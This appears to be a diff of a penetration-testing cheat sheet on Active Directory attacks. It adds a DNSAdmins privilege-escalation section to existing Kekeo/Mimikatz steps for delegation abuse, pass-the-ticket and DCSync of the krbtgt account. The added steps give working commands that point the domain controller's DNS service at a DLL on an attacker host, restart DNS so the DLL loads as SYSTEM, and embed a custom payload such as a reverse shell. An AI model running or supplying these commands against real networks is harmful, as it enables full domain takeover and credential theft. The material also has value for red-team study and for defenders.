@@ -253,7 +253,7 @@ Invoke-Mimikatz -command '"kerberos::ptt filename_to_tgs_from_kekeo.kirbi"'
 ls \\dom.local\c$
 ```
 
-5\.  Using asktgt from Kekeo, we request a TGT and then a TGS
+**5.  Using asktgt from Kekeo, we request a TGT and then a TGS**
 
 ```powershell
 tgt::ask /user:usernae$ /domain:dom.local /rc4:rc4here
@@ -266,4 +266,56 @@ tgs::s4u /tgt:filename.kirbi /user:Administrator@dom.local /service:time/dom.loc
 Invoke-Mimikatz -command '"kerberos::ptt filename.kirbi"'
 Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 ```
+
+## 🤖DNSAdmins Privilege Escalation
+
+### Description
+
+* It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM)
+* In case the DC also servers as DNS, this will provide us escalation to DA
+* Need privileges to restart the DNS service
+* If we compromise an account, which is a member of the DNSAdmins Group, we can get DA
+
+### Requirement
+
+* DC serves also as DNS Server
+* We compromised a User, who is member of DNSAdmins Group
+* Misonfiguration which is needed: DNSAdmins group, need the privs to restart the DNS Service - this is by default disabled. &#x20;
+
+### Tool
+
+**1. Enumerate the member sof the DNSAdmins group (PowerView)**
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>PowerView
+</strong><strong>Get-NetGroupMember -GroupName "DNSAdmins"
+</strong>
+AD-Module
+Get-ADGroupMember -Identity DNSAdmins
+</code></pre>
+
+**2. From the privileges of DNSAdmins group member, configure DLL using**&#x20;
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>Using dnscmd.exe (needs RSAT DNS installed on the compromised machine)
+</strong><strong>dnscmd dom.local /config /serverlevelplugindll \\attackerhost\dll\mimilib.dll
+</strong>
+Using DNSServer module (needs RSAT DNS installed on the compromised machine)
+$dnsettings = Get-DnsServerSetting -computername dc-hostname -verbose -all
+$dnsettings.ServerLevelPluginDll="\\attackerhost\dll\mimilib.dll"
+Set-DnsServerSetting -InputObject $dnsettings -computername dc-hostname -verbose
+</code></pre>
+
+This sets a new Key in HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters called ServerLevelPluginDll with the value of \\\attackerhost\dll\mimilib.dll
+
+**3. Restart the DNS Service**
+
+```powershell
+sc \\dc-hostname stop dns
+sc \\dc-hostname start dns
+```
+
+A new file called kiwidns.log is creatd in C:\Windows\System32 and all the DNS requests are logged there.
+
+Modify the kdns.c with your own payload. This is a synchronous task, so if you start a reverse shell, the DNS service itself will stop in this host.
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
